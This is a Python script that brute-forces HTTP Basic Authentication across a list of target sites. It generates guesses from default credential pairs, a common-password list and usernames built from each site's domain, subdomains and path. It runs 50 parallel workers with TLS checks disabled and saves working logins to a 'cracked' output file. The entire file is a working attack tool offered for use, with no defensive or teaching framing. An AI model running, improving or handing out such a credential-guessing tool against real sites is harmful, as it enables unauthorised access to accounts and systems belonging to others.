#Bozx
import requests
import argparse
from urllib.parse import urlparse
from requests.auth import HTTPBasicAuth
from itertools import permutations, combinations
from urllib3.exceptions import InsecureRequestWarning
from multiprocessing import Pool, Manager
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.poolmanager import PoolManager
from OpenSSL import SSL

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)





class UnsafeRenegotiationAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        """Create and initialize the urllib3 PoolManager."""
        self.poolmanager = PoolManager(
            num_pools=connections,
            maxsize=maxsize,
            block=block,
            ssl_version=SSL.SSLv23_METHOD,  # Use SSL/TLS method that allows unsafe renegotiation.
        )

# Then use it for your session
session = requests.Session()
session.mount("https://", UnsafeRenegotiationAdapter())



# List of common passwords
passwords = [
    'Password1!', 'Admin123!', 'Welcome1!', 'Qwerty1!', 'Abcd1234!', 'Passw0rd!', 
    'Letmein1!', 'Pa55w0rd!', 'Trustno1!', 'Admin@123', 'ChangeMe123!', 
    'TempPass123!', 'ILoveYou1!', 'Summer2023!', 'Winter2023!', 'Spring2023!',
    'Fall2023!', 'Hello123!', 'Secret1!', 'Access14!', '123456', '123456789',
    'qwerty', 'password', '12345', '12345678', '111111', '1234567', 'sunshine', 
    'qwertyuiop', 'iloveyou', 'princess', 'admin', 'welcome', '666666', 'abc123', 
    'football', '123123', 'monkey', '654321', '!@#$%^&*', 'charlie', 'aa123456', 
    'donald', 'password1', 'qwerty123'
]


default_credentials = [
    ('admin', 'admin'),
    ('root', 'root'),
    ('admin', 'password'),
    ('admin', ''),
    ('admin', 'nimda'),
    ('root', 'toor'),
    ('', ''),
]
'''
#old generate_credentials function
def generate_credentials(url):
    parsed = urlparse(url)
    hostname_parts = parsed.hostname.split('.')
    path_parts = parsed.path.strip('/').split('/')
    credentials = []

    # Add default credentials
    credentials.extend(default_credentials)

    # Add domain:domain, domain:reversed_domain
    if len(hostname_parts) > 1:
        domain = '.'.join(hostname_parts[-2:])
        credentials.extend([
            (domain, domain),
            (domain, domain[::-1])
        ])

    # Handle subdomains
    if len(hostname_parts) > 2:
        subdomains = hostname_parts[:-2]
        for subdomain in subdomains:
            # Handle multiple parts in subdomain separated by '-'
            parts = subdomain.split('-')
            for i in range(1, len(parts) + 1):
                for subset in combinations(parts, i):
                    part_combo = ''.join(subset)
                    credentials.extend([
                        (part_combo, part_combo),
                        (part_combo, part_combo[::-1]),
                        (part_combo+domain, part_combo+domain),
                        (part_combo+domain, part_combo),
                        (part_combo, domain),
                        (part_combo, part_combo+domain)
                    ])

    # Handle paths
    if path_parts:
        path = path_parts[0]
        credentials.extend([
            (path, path),
            (path, path[::-1]),
            (domain+path, domain+path),
            (domain+path, domain)
        ])

        for subdomain_combo in [c[0] for c in credentials]:
            credentials.extend([
                (subdomain_combo+path, subdomain_combo+path),
                (subdomain_combo+domain+path, subdomain_combo+domain+path),
            ])

    # Add common passwords with the same username
    credentials.extend([(p, p) for p in passwords])

    return credentials
'''
def generate_credentials(url):
    parsed = urlparse(url)
    hostname_parts = parsed.hostname.split('.')
    path_parts = parsed.path.strip('/').split('/')
    usernames = []
    credentials = []

    # Add default credentials
    credentials.extend(default_credentials)
    usernames.extend([user for user, _ in default_credentials])

    # Add additional usernames
    additional_usernames = ['restricted', 'dev', 'developer', 'stage', 'test', 'prod', 'demo', 'd3v', 'd3v3l0p3r', 
                            'admin', 'administrator', 'root', 'anonymous', 'ftp', 'guest', 'superadmin', 'tomcat', 
                            'user', 'test', 'public', 'mysql', 'true']
    usernames.extend(additional_usernames)

    # Add domain:domain, domain:reversed_domain
    if len(hostname_parts) > 1:
        domain = '.'.join(hostname_parts[-2:])
        usernames.append(domain)
        credentials.extend([
            (domain, domain),
            (domain, domain[::-1])
        ])

    # Handle subdomains
    if len(hostname_parts) > 2:
        subdomains = hostname_parts[:-2]
        for subdomain in subdomains:
            # Handle multiple parts in subdomain separated by '-'
            parts = subdomain.split('-')
            for i in range(1, len(parts) + 1):
                for subset in combinations(parts, i):
                    part_combo = ''.join(subset)
                    usernames.append(part_combo)
                    credentials.extend([
                        (part_combo, part_combo),
                        (part_combo, part_combo[::-1]),
                        (part_combo+domain, part_combo+domain),
                        (part_combo+domain, part_combo),
                        (part_combo, domain),
                        (part_combo, part_combo+domain)
                    ])

    # Handle paths
    if path_parts:
        path = path_parts[0]
        usernames.append(path)
        credentials.extend([
            (path, path),
            (path, path[::-1]),
            (domain+path, domain+path),
            (domain+path, domain)
        ])

        for subdomain_combo in [c[0] for c in credentials]:
            credentials.extend([
                (subdomain_combo+path, subdomain_combo+path),
                (subdomain_combo+domain+path, subdomain_combo+domain+path),
            ])

    # Add common passwords with the same username
    credentials.extend([(p, p) for p in passwords])

    # Add all combinations of usernames and passwords
    credentials.extend([(user, passw) for user in usernames for passw in passwords])

    return credentials
'''
def try_credentials(url, credentials):
    for username, password in credentials:
        try:
            response = requests.get(url, verify=False, auth=HTTPBasicAuth(username, password))
            if response.status_code == 200:
                result = f"Success! {username}:{password}@{url}"
                print(result)
                return result
            else:
                print(f"Failed! {username}:{password}@{url}")
        except Exception as e:
            print(f"Error encountered while trying credentials on {url}: {e}")
    return None
'''
'''
def try_credential(args):
    url, username, password, cracked_credentials = args
    try:
        response = requests.get(url, verify=False, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            result = f"Success! {username}:{password}@{url}"
            print(result)
            cracked_credentials.append(result)
        else:
            pass
#            print(f"Failed! {username}:{password}@{url}")
    except Exception as e:
        print(f"Error encountered while trying credentials on {url}: {e}")
'''

def try_credential(args):
    url, username, password, cracked_credentials = args
    try:
        response = requests.get(url, verify=False, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            result = f"Success! {username}:{password}@{url}"
            print(result)
            cracked_credentials.append(result)
        else:
            pass
#            print(f"Failed! {username}:{password}@{url}")
    except requests.exceptions.SSLError as e:
        print(f"SSL Error encountered while trying credentials on {url}: {e}")
        return  # skip this credential if an SSL error is encountered
    except Exception as e:
        print(f"Error encountered while trying credentials on {url}: {e}")

def try_credentials(url, credentials):
    with Manager() as manager:
        cracked_credentials = manager.list()
        args = [(url, user, passw, cracked_credentials) for user, passw in credentials]

        with Pool(50) as p:  # Create a pool of 100 worker processes
            p.map(try_credential, args)
        
        return list(cracked_credentials)

parser = argparse.ArgumentParser(description="HTTP Basic Authentication Brute Forcer")
parser.add_argument('-f', '--file', help="Input file with list of sites", required=True)
parser.add_argument('-o', '--output', help="Output file to save cracked credentials", default='basic-cracked.txt')

args = parser.parse_args()

with open(args.file, 'r') as f:
    urls = [line.strip() for line in f]

cracked_credentials = []
for url in urls:
    creds = generate_credentials(url)
    result = try_credentials(url, creds)
    if result:
        cracked_credentials.append(result)

with open(args.output, 'a') as f:
    for line in cracked_credentials:
        f.write('\n'.join(line) + '\n')
